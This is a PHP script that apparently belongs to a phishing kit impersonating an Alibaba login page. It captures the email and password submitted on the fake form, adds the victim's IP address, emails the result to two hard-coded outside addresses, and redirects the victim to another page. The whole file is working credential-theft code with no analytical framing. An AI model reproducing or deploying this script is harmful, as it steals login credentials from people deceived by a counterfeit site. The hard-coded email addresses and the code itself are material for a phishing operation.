<?
                                                                                                                                                                        

                                                            
$ip = getenv("REMOTE_ADDR");
$message .= "--------------New Login--------\n";
$message .= "Email-ID : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['pass']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------Created BY Machine-----------\n";
$send = "poglogs1@gmail.com,poglogs@hotmail.com";
$subject = "Alibaba Login";


mail($send,$subject,$message,$headers);


$redirect = "loader1.htm";

header("Location: " . $redirect);
 
?>